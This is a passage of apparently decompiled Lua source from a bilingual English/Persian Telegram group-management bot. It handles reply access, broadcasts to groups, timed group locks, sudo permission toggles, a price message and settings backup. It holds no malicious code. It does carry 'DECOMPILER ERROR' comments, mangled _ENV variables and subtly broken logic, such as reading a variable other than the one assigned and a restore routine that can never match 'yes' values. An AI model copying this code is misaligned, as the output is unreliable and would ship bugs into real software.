                                              if not redis:sismember("SudoAccess" .. (msg.from).id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
                                                if not lang then
                                                  return ErrorAccessSudo(msg)
                                                else
                                                  return ErrorAccessSudo(msg)
                                                end
                                              else
                                                _ENV.ReplyHash = redis:smembers("BotReply:" .. matches[2])
                                                if #_ENV.ReplyHash == 0 then
                                                  if not lang then
                                                    return "`Reply not found!`"
                                                  else
                                                    return "`پاسخ یافت نشد!`"
                                                  end
                                                else
                                                  _ENV.BotReplyMembers = function(msg)
    -- function num : 0_56_14 , upvalues : _ENV
    text = ""
    for k,v in pairs(ReplyHash) do
      text = text .. "" .. v .. "\n"
    end
    return text
  end

                                                  if not lang then
                                                    _ENV.Messa = "*List of* {`" .. matches[2] .. "`} *Reply:*\n\n"
                                                  else
                                                    _ENV.Messa = "لیست پاسخ های {`" .. matches[2] .. "`} :\n\n"
                                                  end
                                                  _ENV.Words = (_ENV.BotReplyMembers)(msg)
                                                  return _ENV.Messa .. "" .. _ENV.Words
                                                end
                                              end
                                            end
                                            if (matches[1] == "replyaccess" or matches[1] == "دسترسی پاسخ") and is_sudo(msg) then
                                              if not redis:sismember("SudoAccess" .. (msg.from).id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
                                                if not lang then
                                                  return ErrorAccessSudo(msg)
                                                else
                                                  return ErrorAccessSudo(msg)
                                                end
                                              else
                                                _ENV.ReplyHash = redis:smembers("BotReply:" .. matches[2])
                                                if #_ENV.ReplyHash == 0 then
                                                  if not lang then
                                                    return "`Reply not found!`"
                                                  else
                                                    return "`پاسخ یافت نشد!`"
                                                  end
                                                else
                                                  if (matches[3]):lower() == "sudo" or matches[3] == "سودو" then
                                                    redis:set("BotReplyAccess:" .. matches[2], "sudo")
                                                    if not lang then
                                                      return "{" .. matches[2] .. "} Access Changed To: " .. matches[3]
                                                    else
                                                      return "دسترسی {" .. matches[2] .. "} تغییر کرد به: " .. matches[3]
                                                    end
                                                  else
                                                    if (matches[3]):lower() == "owner" or matches[3] == "مالک گروه" then
                                                      redis:set("BotReplyAccess:" .. matches[2], "owner")
                                                      if not lang then
                                                        return "{" .. matches[2] .. "} Access Changed To: " .. matches[3]
                                                      else
                                                        return "دسترسی {" .. matches[2] .. "} تغییر کرد به: " .. matches[3]
                                                      end
                                                    else
                                                      if (matches[3]):lower() == "moderator" or matches[3] == "مدیر گروه" then
                                                        redis:set("BotReplyAccess:" .. matches[2], "moderator")
                                                        if not lang then
                                                          return "{" .. matches[2] .. "} Access Changed To: " .. matches[3]
                                                        else
                                                          return "دسترسی {" .. matches[2] .. "} تغییر کرد به: " .. matches[3]
                                                        end
                                                      else
                                                        if matches[3] == "0" then
                                                          redis:del("BotReplyAccess:" .. matches[2])
                                                          if not lang then
                                                            return "{" .. matches[2] .. "} Access Changed To: All Users"
                                                          else
                                                            return "دسترسی {" .. matches[2] .. "} تغییر کرد به: همه کاربران"
                                                          end
                                                        else
                                                          if not lang then
                                                            return "*Input is not correct!*\n`sudo`/`owner`/`moderator`/`0`"
                                                          else
                                                            return "ورودی صحیح نیست!\n`سودو`/`مالک گروه`/`مدیر گروه`/`0`"
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                            lang = redis:get("gp_lang:" .. msg.chat_id_)
                                            _ENV.sense = "sense:" .. msg.chat_id_
                                            data = load_data("./data/moderation.json")
                                            if ((matches[1]):lower() == "sense" or matches[1] == "هوش مصنوعی") and is_owner(msg) and data[tostring((msg.to).id)] then
                                              if (matches[2]):lower() == "true" or (matches[2]):lower() == "enable" or (matches[2]):lower() == "on" or matches[2] == "روشن" then
                                                if not redis:get(_ENV.sense) then
                                                  redis:set(_ENV.sense, true)
                                                  if not lang then
                                                    return "*Bot sense has been enabled*"
                                                  else
                                                    return "*هوش ربات فعال شد*"
                                                  end
                                                else
                                                  if not lang then
                                                    return "*Bot sense is already enabled!*"
                                                  else
                                                    return "*هوش ربات از قبل فعال بوده است!*"
                                                  end
                                                end
                                              else
                                                if (matches[2]):lower() == "false" or (matches[2]):lower() == "disable" or (matches[2]):lower() == "off" or matches[2] == "خاموش" then
                                                  if redis:get(_ENV.sense) then
                                                    redis:del(_ENV.sense)
                                                    if not lang then
                                                      return "*Bot sense has been disabled*"
                                                    else
                                                      return "*هوش ربات غيرفعال شد*"
                                                    end
                                                  else
                                                    if not lang then
                                                      return "*Bot sense is not enabled!*"
                                                    else
                                                      return "*هوش ربات فعال نيست!*"
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                            if (matches[1] == "amar" or matches[1] == "statistic" or matches[1] == "آمار") and is_sudo(msg) then
                                              _ENV.EnGroups = redis:scard("Bot(EN)Groups")
                                              _ENV.FaGroups = redis:scard("Bot(FA)Groups")
                                              _ENV.AllGroups = redis:scard("BotGroups")
                                              _ENV.i_ = NumberChats(msg)
                                              _ENV.i = tonumber(_ENV.i) - tonumber(_ENV.AllGroups)
                                              if _ENV.i < 0 then
                                                _ENV.i = 0
                                              end
                                              _ENV.AllMsgs = 0
                                              for k,v in (_ENV.pairsByKeys)(data[tostring("groups")]) do
                                                _ENV.Messages = redis:get("getMessages:" .. v) or 0
                                                _ENV.AllMsgs = tonumber(_ENV.AllMsgs + _ENV.Messages)
                                              end
                                              if not lang then
                                                return "*Bot Statistics:*\n\nInstalled Groups: `" .. _ENV.AllGroups .. "`\nillegal Groups(Not installed): `" .. _ENV.i .. "`\nGroups With En Language: `" .. _ENV.EnGroups .. "`\nGroups With Fa Language: `" .. _ENV.FaGroups .. "`\nNumber of All Groups Received Messages: `" .. _ENV.AllMsgs .. "`"
                                              else
                                                return "آمار ربات:\n\nگروه های نصب شده: `" .. _ENV.AllGroups .. "`\nگروه های غیرمجاز(نصب نشده): `" .. _ENV.i .. "`\nگروه ها با زبان انگلیسی: `" .. _ENV.EnGroups .. "`\nگروه ها با زبان فارسی: `" .. _ENV.FaGroups .. "`\nتعداد کل پیام های دریافتی گروه ها: `" .. _ENV.AllMsgs .. "`"
                                              end
                                            end
                                            if (matches[1] == "sendpmto" or matches[1] == "ارسال پیام به") and is_sudo(msg) then
                                              if not redis:sismember("SudoAccess" .. (msg.from).id, "sendpm") and is_sudo(msg) and not is_botOwner(msg) then
                                                if not lang then
                                                  return ErrorAccessSudo(msg)
                                                else
                                                  return ErrorAccessSudo(msg)
                                                end
                                              else
                                                ;
                                                (tdcli.sendMessage)(tonumber(matches[2]), 0, 1, matches[3], 1, "md")
                                                return "پیام ارسال شد"
                                              end
                                            else
                                              if (matches[1] == "sendpm" or matches[1] == "ارسال پیام") and is_sudo(msg) then
                                                if not redis:sismember("SudoAccess" .. (msg.from).id, "sendpm") and is_sudo(msg) and not is_botOwner(msg) then
                                                  if not lang then
                                                    return ErrorAccessSudo(msg)
                                                  else
                                                    return ErrorAccessSudo(msg)
                                                  end
                                                else
                                                  _ENV.BotGroups = redis:smembers("BotGroups")
                                                  for k,v in (_ENV.pairs)(_ENV.BotGroups) do
                                                    (tdcli.sendMessage)(v, 0, 1, matches[2], 1, "md")
                                                  end
                                                end
                                              end
                                            end
                                            do
                                              if (matches[1] == "lockgroup" or matches[1] == "قفل گروه") and matches[2] and (matches[3]):match("(%d+:%d+)") and is_owner(msg) then
                                                _ENV.h1_ = matches[2]
                                                _ENV.h2_ = matches[3]
                                                _ENV.h1 = (_ENV.h1_):gsub(":", "")
                                                _ENV.h2 = (_ENV.h2_):gsub(":", "")
                                                _ENV.t = (((_ENV.os).date)()):match("%d+:%d+")
                                                _ENV.currentTime = (_ENV.t):gsub(":", "")
                                                if _ENV.currentTime == "No connection" then
                                                  (_ENV.SendError)(msg, "*Server Time Has A Problem Please Try Again Later!*", "*زمان سرور یک مشکل دارد لطفا بعدا دوباره تلاش کنید!*")
                                                else
                                                  if tonumber(_ENV.h1) >= 0 and tonumber(_ENV.h1) <= 2400 and tonumber(_ENV.h2) >= 0 and tonumber(_ENV.h2) <= 2400 then
                                                    redis:set("LockGpH1:" .. (msg.to).id, _ENV.h1)
                                                    redis:set("LockGpH2:" .. (msg.to).id, _ENV.h2)
                                                    if not lang then
                                                      return "*Group has been locked from* `" .. _ENV.h1_ .. "` *hour than* `" .. _ENV.h2_ .. "` *for everyday*"
                                                    else
                                                      return "*گروه برای هر روز از ساعت* `" .. _ENV.h1_ .. "` *تا* `" .. _ENV.h2_ .. "` *قفل شد*"
                                                    end
                                                  else
                                                    if not lang then
                                                      return "*Time is not correct!*"
                                                    else
                                                      return "*زمان درست نیست!*"
                                                    end
                                                  end
                                                end
                                              else
                                                if (matches[1] == "lockgroup" or matches[1] == "قفل گروه") and matches[2] and (matches[3]):match("(.*)") and is_owner(msg) then
                                                  if (matches[3]):lower() == "s" or matches[3] == "ثانیه" then
                                                    _ENV.T = tonumber(matches[2])
                                                    redis:setex("~LockGroup~" .. (msg.to).id, _ENV.T, true)
                                                    if not lang then
                                                      return "*Group has been locked for:* `" .. _ENV.T .. "` *Second*"
                                                    else
                                                      return "گروه برای `" .. _ENV.T .. "` ثانیه قفل شد"
                                                    end
                                                  else
                                                    if (matches[3]):lower() == "m" or matches[3] == "دقیقه" then
                                                      _ENV.T = tonumber(matches[2]) * 60
                                                      redis:setex("~LockGroup~" .. (msg.to).id, _ENV.T, true)
                                                      if not lang then
                                                        return "*Group has been locked for:* `" .. tonumber(matches[2]) .. "` *Minutes*"
                                                      else
                                                        return "گروه برای `" .. tonumber(matches[2]) .. "` دقیقه قفل شد"
                                                      end
                                                    else
                                                      if (matches[3]):lower() == "h" or matches[3] == "ساعت" then
                                                        _ENV.T = tonumber(matches[2]) * 3600
                                                        redis:setex("~LockGroup~" .. (msg.to).id, _ENV.T, true)
                                                        if not lang then
                                                          return "*Group has been locked for:* `" .. tonumber(matches[2]) .. "` *Hour*"
                                                        else
                                                          return "گروه برای `" .. tonumber(matches[2]) .. "` ساعت قفل شد"
                                                        end
                                                      else
                                                        if (matches[3]):lower() == "d" or matches[3] == "روز" then
                                                          _ENV.T = tonumber(matches[2]) * 86400
                                                          redis:setex("~LockGroup~" .. (msg.to).id, _ENV.T, true)
                                                          if not lang then
                                                            return "*Group has been locked for:* `" .. tonumber(matches[2]) .. "` *Day*"
                                                          else
                                                            return "گروه برای `" .. tonumber(matches[2]) .. "` روز قفل شد"
                                                          end
                                                        else
                                                          if not lang then
                                                            return "*Help:*\n`s` = Second\n`m` Minutes\n`h` = Hour\n`d` = Day"
                                                          else
                                                            return "راهنما:\n`s` = ثانیه\n`m` دقیقه\n`h` = ساعت\n`d` = روز"
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                              if (matches[1] == "unlockgroup" or matches[1] == "بازکردن گروه") and is_owner(msg) then
                                                if redis:get("LockGpH1:" .. (msg.to).id) then
                                                  redis:del("LockGpH1:" .. (msg.to).id)
                                                  redis:del("LockGpH2:" .. (msg.to).id)
                                                  redis:hdel("GroupSettings:" .. (msg.to).id, "mute_all")
                                                  if not lang then
                                                    return "*Group has been unlocked*"
                                                  else
                                                    return "*گروه باز شد*"
                                                  end
                                                else
                                                  if redis:get("~LockGroup~" .. (msg.to).id) then
                                                    redis:del("~LockGroup~" .. (msg.to).id)
                                                    if not lang then
                                                      return "*Group has been unlocked*"
                                                    else
                                                      return "*گروه باز شد*"
                                                    end
                                                  else
                                                    if not lang then
                                                      return "*Group is not locked!*"
                                                    else
                                                      return "*گروه قفل نیست!*"
                                                    end
                                                  end
                                                end
                                              end
                                              if (matches[1] == "addsettings" or matches[1] == "اضافه کردن تنظیمات") and is_owner(msg) then
                                                if redis:sismember("GroupAddSettings:" .. (msg.to).id, matches[2]) then
                                                  if not lang then
                                                    return "[`" .. matches[2] .. "`] *Already Added!*"
                                                  else
                                                    return "[`" .. matches[2] .. "`] از قبل اضافه شده است!"
                                                  end
                                                else
                                                  redis:set("ForAddSettings:" .. (msg.to).id .. ":" .. (msg.from).id, "w8")
                                                  redis:set("AddSettingsName:" .. (msg.to).id .. ":" .. (msg.from).id, matches[2])
                                                  if not lang then
                                                    return "*Please Send Locks Name Now For Add To [`" .. matches[2] .. "`]*\nCancel With `cancel`\nFinish With `done`"
                                                  else
                                                    return "لطفا هم اکنون نام قفلی را برای اضافه کردن به [`" .. matches[2] .. "`] ارسال کنید\nلغو با `cancel`\nپایان با `done`"
                                                  end
                                                end
                                              end
                                              if (matches[1] == "delsettings" or matches[1] == "حذف تنظیمات") and is_owner(msg) then
                                                if redis:sismember("GroupAddSettings:" .. (msg.to).id, matches[2]) then
                                                  redis:srem("GroupAddSettings:" .. (msg.to).id, matches[2])
                                                  redis:del("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. matches[2])
                                                  if not lang then
                                                    return "[`" .. matches[2] .. "`] *Deleted!*"
                                                  else
                                                    return "[`" .. matches[2] .. "`] حذف شد!"
                                                  end
                                                else
                                                  if not lang then
                                                    return "[`" .. matches[2] .. "`] *is Not Added!*"
                                                  else
                                                    return "[`" .. matches[2] .. "`] اضافه نشده است!"
                                                  end
                                                end
                                              end
                                              if matches[1] == "cmds" and is_mod(msg) then
                                                if not matches[2] then
                                                  redis:del("WaitForCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  redis:del("WaitForCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  redis:del("WaitForFaCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  redis:del("WaitForFaCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  if is_sudo(msg) or is_botOwner(msg) then
                                                    redis:setex("WaitForCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id, 300, "w8")
                                                    if not lang then
                                                      return "Choose Cmds:\n\n`0-` Cancel\n`1-` Sudo Cmds\n`2-` Owner Cmds\n`3-` Moderator Cmds"
                                                    else
                                                      return "دستورات را انتخاب کنید:\n\n`0-` لغو\n`1-` دستورات سودو\n`2-` دستورات مالک گروه\n`3-` دستورات مدیران گروه"
                                                    end
                                                  else
                                                    if is_owner(msg) then
                                                      redis:setex("WaitForCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id, 300, "w8")
                                                      if not lang then
                                                        return "Choose Cmds:\n\n`0-` Cancel\n`1-` Owner Cmds\n`2-` Moderator Cmds"
                                                      else
                                                        return "دستورات را انتخاب کنید:\n\n`0-` لغو\n`1-` دستورات مالک گروه\n`2-` دستورات مدیران گروه"
                                                      end
                                                    else
                                                      if is_mod(msg) then
                                                        text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. (msg.to).id))).HelpForModerator
                                                        ;
                                                        (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                      end
                                                    end
                                                  end
                                                else
                                                  if ((matches[2]):lower() == "sudo" or matches[2] == "سودو") and is_sudo(msg) then
                                                    text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. (msg.to).id))).HelpForSudo
                                                    ;
                                                    (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                  else
                                                    if ((matches[2]):lower() == "owner" or matches[2] == "مالک") and is_owner(msg) then
                                                      text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. (msg.to).id))).HelpForOwner
                                                      ;
                                                      (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                    else
                                                      if ((matches[2]):lower() == "moderator" or matches[2] == "مدیر") and is_mod(msg) then
                                                        text = ((_ENV.GetCmds)(redis:get("gp_lang:" .. (msg.to).id))).HelpForModerator
                                                        ;
                                                        (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                              if matches[1] == "دستورات" and is_mod(msg) then
                                                if not matches[2] then
                                                  redis:del("WaitForCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  redis:del("WaitForCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  redis:del("WaitForFaCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  redis:del("WaitForFaCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id)
                                                  if is_sudo(msg) or is_botOwner(msg) then
                                                    redis:setex("WaitForFaCmdsSudo:" .. (msg.to).id .. ":" .. (msg.from).id, 300, "w8")
                                                    return "دستورات را انتخاب کنید:\n\n`0-` لغو\n`1-` دستورات سودو\n`2-` دستورات مالک گروه\n`3-` دستورات مدیران گروه"
                                                  else
                                                    if is_owner(msg) then
                                                      redis:setex("WaitForFaCmdsOwner:" .. (msg.to).id .. ":" .. (msg.from).id, 300, "w8")
                                                      return "دستورات را انتخاب کنید:\n\n`0-` لغو\n`1-` دستورات مالک گروه\n`2-` دستورات مدیران گروه"
                                                    else
                                                      if is_mod(msg) then
                                                        text = ((_ENV.GetFaCmds)()).HelpForModerator
                                                        ;
                                                        (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                      end
                                                    end
                                                  end
                                                else
                                                  if ((matches[2]):lower() == "sudo" or matches[2] == "سودو") and is_sudo(msg) then
                                                    text = ((_ENV.GetFaCmds)()).HelpForSudo
                                                    ;
                                                    (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                  else
                                                    if ((matches[2]):lower() == "owner" or matches[2] == "مالک") and is_owner(msg) then
                                                      text = ((_ENV.GetFaCmds)()).HelpForOwner
                                                      ;
                                                      (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                    else
                                                      if ((matches[2]):lower() == "moderator" or matches[2] == "مدیر") and is_mod(msg) then
                                                        text = ((_ENV.GetFaCmds)()).HelpForModerator
                                                        ;
                                                        (tdcli.sendMessage)((msg.to).id, msg.id_, 0, text, 0, "md")
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                              if (matches[1] == "sudoaccess" or matches[1] == "دسترسی سودو") and is_sudo(msg) then
                                                if not redis:sismember("SudoAccess" .. (msg.from).id, "sudoaccess") and is_sudo(msg) and not is_botOwner(msg) then
                                                  if not lang then
                                                    return ErrorAccessSudo(msg)
                                                  else
                                                    return ErrorAccessSudo(msg)
                                                  end
                                                else
                                                  _ENV.Access1 = "🚫"
                                                  _ENV.Access2 = "🚫"
                                                  _ENV.Access3 = "🚫"
                                                  _ENV.Access4 = "🚫"
                                                  _ENV.Access5 = "🚫"
                                                  _ENV.Access6 = "🚫"
                                                  _ENV.Access7 = "🚫"
                                                  _ENV.Access8 = "🚫"
                                                  if redis:sismember("SudoAccess" .. matches[2], "installgroups") then
                                                    _ENV.Access1 = "✔️"
                                                  end
                                                  if redis:sismember("SudoAccess" .. matches[2], "removegroups") then
                                                    _ENV.Access2 = "✔️"
                                                  end
                                                  if redis:sismember("SudoAccess" .. matches[2], "banall") then
                                                    _ENV.Access3 = "✔️"
                                                  end
                                                  if redis:sismember("SudoAccess" .. matches[2], "unbanall") then
                                                    _ENV.Access4 = "✔️"
                                                  end
                                                  if redis:sismember("SudoAccess" .. matches[2], "sudoaccess") then
                                                    _ENV.Access5 = "✔️"
                                                  end
                                                  if redis:sismember("SudoAccess" .. matches[2], "editbot") then
                                                    _ENV.Access6 = "✔️"
                                                  end
                                                  if redis:sismember("SudoAccess" .. matches[2], "botreply") then
                                                    _ENV.Access7 = "✔️"
                                                  end
                                                  if redis:sismember("SudoAccess" .. matches[2], "installvip") then
                                                    _ENV.Access8 = "✔️"
                                                  end
                                                  SudoAccess = "*1-*`نصب گروه ها؟` " .. _ENV.Access1 .. "\n*2-*`حذف گروه ها؟` " .. _ENV.Access2 .. "\n*3-*`بن کردن یک فرد از همه گروه ها؟` " .. _ENV.Access3 .. "\n*4-*`آنبن کردن یک فرد از همه گروه ها؟` " .. _ENV.Access4 .. "\n*5-*`ویرایش دسترسی سودوهای دیگر؟` " .. _ENV.Access5 .. "\n*6-*`ویرایش ربات؟` " .. _ENV.Access6 .. "\n*7-*`اضافه کردن سوال و پاسخ به ربات؟` " .. _ENV.Access7 .. "\n*8-*`ویژه کردن گروه ها` " .. _ENV.Access8
                                                  if (_ENV.CheckIsSudo)(msg, tonumber(matches[2])) then
                                                    if (matches[3]):lower() == "all" or matches[3] == "همه" then
                                                      return "چگونگی تغییر دسترسی یک سودو:\n/sudoaccess `ID` `NUMBER`\n به جای ID آیدی عددی کاربر و به جای NUMBER یکی از اعداد زیر را قرار دهید\nدسترسی های " .. matches[2] .. " عبارتند از:\n" .. SudoAccess
                                                    else
                                                      if (matches[3]):lower() == "full" or matches[3] == "کامل" then
                                                        if not redis:sismember("SudoAccess" .. matches[2], "installgroups") then
                                                          redis:sadd("SudoAccess" .. matches[2], "installgroups")
                                                        end
                                                        if not redis:sismember("SudoAccess" .. matches[2], "removegroups") then
                                                          redis:sadd("SudoAccess" .. matches[2], "removegroups")
                                                        end
                                                        if not redis:sismember("SudoAccess" .. matches[2], "banall") then
                                                          redis:sadd("SudoAccess" .. matches[2], "banall")
                                                        end
                                                        if not redis:sismember("SudoAccess" .. matches[2], "unbanall") then
                                                          redis:sadd("SudoAccess" .. matches[2], "unbanall")
                                                        end
                                                        if not redis:sismember("SudoAccess" .. matches[2], "sudoaccess") then
                                                          redis:sadd("SudoAccess" .. matches[2], "sudoaccess")
                                                        end
                                                        if not redis:sismember("SudoAccess" .. matches[2], "editbot") then
                                                          redis:sadd("SudoAccess" .. matches[2], "editbot")
                                                        end
                                                        if not redis:sismember("SudoAccess" .. matches[2], "botreply") then
                                                          redis:sadd("SudoAccess" .. matches[2], "botreply")
                                                        end
                                                        if not redis:sismember("SudoAccess" .. matches[2], "installvip") then
                                                          redis:sadd("SudoAccess" .. matches[2], "installvip")
                                                        end
                                                        return "تمام دسترسی ها برای " .. matches[2] .. " فعال شدند"
                                                      else
                                                        if (matches[3]):lower() == "close" or matches[3] == "بستن" then
                                                          if redis:sismember("SudoAccess" .. matches[2], "installgroups") then
                                                            redis:srem("SudoAccess" .. matches[2], "installgroups")
                                                          end
                                                          if redis:sismember("SudoAccess" .. matches[2], "removegroups") then
                                                            redis:srem("SudoAccess" .. matches[2], "removegroups")
                                                          end
                                                          if redis:sismember("SudoAccess" .. matches[2], "banall") then
                                                            redis:srem("SudoAccess" .. matches[2], "banall")
                                                          end
                                                          if redis:sismember("SudoAccess" .. matches[2], "unbanall") then
                                                            redis:srem("SudoAccess" .. matches[2], "unbanall")
                                                          end
                                                          if redis:sismember("SudoAccess" .. matches[2], "sudoaccess") then
                                                            redis:srem("SudoAccess" .. matches[2], "sudoaccess")
                                                          end
                                                          if redis:sismember("SudoAccess" .. matches[2], "editbot") then
                                                            redis:srem("SudoAccess" .. matches[2], "editbot")
                                                          end
                                                          if redis:sismember("SudoAccess" .. matches[2], "botreply") then
                                                            redis:srem("SudoAccess" .. matches[2], "botreply")
                                                          end
                                                          if redis:sismember("SudoAccess" .. matches[2], "installvip") then
                                                            redis:srem("SudoAccess" .. matches[2], "installvip")
                                                          end
                                                          return "تمام دسترسی ها برای " .. matches[2] .. " غیر فعال شدند"
                                                        else
                                                          if matches[3] == "1" then
                                                            if redis:sismember("SudoAccess" .. matches[2], "installgroups") then
                                                              redis:srem("SudoAccess" .. matches[2], "installgroups")
                                                              return "غیرفعال شد 🚫"
                                                            else
                                                              redis:sadd("SudoAccess" .. matches[2], "installgroups")
                                                              return "فعال شد ✔️"
                                                            end
                                                          else
                                                            if matches[3] == "2" then
                                                              if redis:sismember("SudoAccess" .. matches[2], "removegroups") then
                                                                redis:srem("SudoAccess" .. matches[2], "removegroups")
                                                                return "غیرفعال شد 🚫"
                                                              else
                                                                redis:sadd("SudoAccess" .. matches[2], "removegroups")
                                                                return "فعال شد ✔️"
                                                              end
                                                            else
                                                              if matches[3] == "3" then
                                                                if redis:sismember("SudoAccess" .. matches[2], "banall") then
                                                                  redis:srem("SudoAccess" .. matches[2], "banall")
                                                                  return "غیرفعال شد 🚫"
                                                                else
                                                                  redis:sadd("SudoAccess" .. matches[2], "banall")
                                                                  return "فعال شد ✔️"
                                                                end
                                                              else
                                                                if matches[3] == "4" then
                                                                  if redis:sismember("SudoAccess" .. matches[2], "unbanall") then
                                                                    redis:srem("SudoAccess" .. matches[2], "unbanall")
                                                                    return "غیرفعال شد 🚫"
                                                                  else
                                                                    redis:sadd("SudoAccess" .. matches[2], "unbanall")
                                                                    return "فعال شد ✔️"
                                                                  end
                                                                else
                                                                  if matches[3] == "5" then
                                                                    if redis:sismember("SudoAccess" .. matches[2], "sudoaccess") then
                                                                      redis:srem("SudoAccess" .. matches[2], "sudoaccess")
                                                                      return "غیرفعال شد 🚫"
                                                                    else
                                                                      redis:sadd("SudoAccess" .. matches[2], "sudoaccess")
                                                                      return "فعال شد ✔️"
                                                                    end
                                                                  else
                                                                    if matches[3] == "6" then
                                                                      if redis:sismember("SudoAccess" .. matches[2], "editbot") then
                                                                        redis:srem("SudoAccess" .. matches[2], "editbot")
                                                                        return "غیرفعال شد 🚫"
                                                                      else
                                                                        redis:sadd("SudoAccess" .. matches[2], "editbot")
                                                                        return "فعال شد ✔️"
                                                                      end
                                                                    else
                                                                      if matches[3] == "7" then
                                                                        if redis:sismember("SudoAccess" .. matches[2], "botreply") then
                                                                          redis:srem("SudoAccess" .. matches[2], "botreply")
                                                                          return "غیرفعال شد 🚫"
                                                                        else
                                                                          redis:sadd("SudoAccess" .. matches[2], "botreply")
                                                                          return "فعال شد ✔️"
                                                                        end
                                                                      else
                                                                        if matches[3] == "8" then
                                                                          if redis:sismember("SudoAccess" .. matches[2], "installvip") then
                                                                            redis:srem("SudoAccess" .. matches[2], "installvip")
                                                                            return "غیرفعال شد 🚫"
                                                                          else
                                                                            redis:sadd("SudoAccess" .. matches[2], "installvip")
                                                                            return "فعال شد ✔️"
                                                                          end
                                                                        end
                                                                      end
                                                                    end
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                    end
                                                  else
                                                    return matches[2] .. " سودو نیست!"
                                                  end
                                                end
                                              end
                                              if (matches[1] == "setnerkh" or matches[1] == "تنظیم نرخ") and is_botOwner(msg) then
                                                redis:set("BotNerkh=", (_ENV.check_markdown)(matches[2]))
                                                if not lang then
                                                  return "*Bot Nerkh changed to:*\n" .. (_ENV.check_markdown)(matches[2])
                                                else
                                                  return "نرخ ربات تغییر کرد به:\n" .. (_ENV.check_markdown)(matches[2])
                                                end
                                              end
                                              if matches[1] == "nerkh" or matches[1] == "نرخ" then
                                                if redis:get("BotNerkh=") then
                                                  return (_ENV.check_markdown)(redis:get("BotNerkh="))
                                                else
                                                  if not lang then
                                                    return "*Nerkh is not set!*"
                                                  else
                                                    return "نرخ تنظیم نشده است!"
                                                  end
                                                end
                                              end
                                              if (matches[1] == "backup" or matches[1] == "بک آپ") and is_owner(msg) then
                                                CreateBackup(msg)
                                              end
                                              if (matches[1] == "getbackup" or matches[1] == "استفاده از بک آپ") and is_owner(msg) then
                                                _ENV.nums = {"mute_all", "mute_gif", "mute_text", "mute_photo", "mute_video", "mute_audio", "mute_voice", "mute_sticker", "mute_contact", "mute_forward", "mute_location", "mute_document", "mute_tgservice", "mute_inline", "mute_game", "mute_keyboard", "lock_link", "lock_tag", "lock_mention", "lock_arabic", "lock_edit", "lock_spam", "flood", "lock_bots", "lock_markdown", "lock_webpage", "lock_pin", "lock_MaxWords", "lock_botchat", "num_msg_max", "MaxWords", "MaxWarn", "FloodTime", "lock_fohsh", "lock_english", "lock_forcedinvite", "ForcedInvite", "lock_username", "lock_join"}
                                                if not matches[2] then
                                                  text = redis:get("SettingsBackupFor:" .. (msg.to).id)
                                                  if not text then
                                                    if not lang then
                                                      return "*This Group Has not Backup!*"
                                                    else
                                                      return "این گروه بک آپ ندارد!"
                                                    end
                                                  else
                                                    for k,v in (_ENV.pairs)(_ENV.nums) do
                                                      if not text:match("-" .. v .. " = yes\n-") and not text:match("-" .. v .. " = no\n-") then
                                                        do
                                                          _ENV.text_ = text:match("-" .. v .. " = %d+\n-")
                                                          _ENV.text_ = (_ENV.text_):gsub("-" .. v .. " = ", "")
                                                          if _ENV.text_ == "yes" then
                                                            redis:hset("GroupSettings:" .. (msg.to).id, v, "yes")
                                                          else
                                                            if _ENV.text_ == "no" then
                                                              redis:hdel("GroupSettings:" .. (msg.to).id, v)
                                                            else
                                                              redis:hset("GroupSettings:" .. (msg.to).id, v, tonumber(_ENV.text_))
                                                            end
                                                          end
                                                          -- DECOMPILER ERROR at PC8418: LeaveBlock: unexpected jumping out IF_THEN_STMT

                                                          -- DECOMPILER ERROR at PC8418: LeaveBlock: unexpected jumping out IF_STMT

                                                        end
                                                      end
                                                    end
                                                    if not lang then
                                                      return "*All Settings Group Changed to Backup!*"
                                                    else
                                                      return "همه ی تنظیمات گروه به بک آپ تغییر کردند!"
                                                    end
                                                  end
                                                else
                                                  if matches[2] then
                                                    text = redis:get("SettingsBackupFor:" .. matches[2])
                                                    if not text then
                                                      if not lang then
                                                        return "*Group* " .. matches[2] .. " *Has not Backup!*"
                                                      else
                                                        return "گروه " .. matches[2] .. " بک آپ ندارد!"
                                                      end
                                                    else
                                                      for k,v in (_ENV.pairs)(_ENV.nums) do
                                                        if not text:match("-" .. v .. " = yes\n-") and not text:match("-" .. v .. " = no\n-") then
                                                          do
                                                            _ENV.text_ = text:match("-" .. v .. " = %d+\n-")
                                                            _ENV.text_ = (_ENV.text_):gsub("-" .. v .. " = ", "")
                                                            if _ENV.text_ == "yes" then
                                                              redis:hset("GroupSettings:" .. (msg.to).id, v, "yes")
                                                            else
                                                              if _ENV.text_ == "no" then
                                                                redis:hdel("GroupSettings:" .. (msg.to).id, v)
                                                              else
                                                                redis:hset("GroupSettings:" .. (msg.to).id, v, tonumber(_ENV.text_))
                                                              end
                                                            end
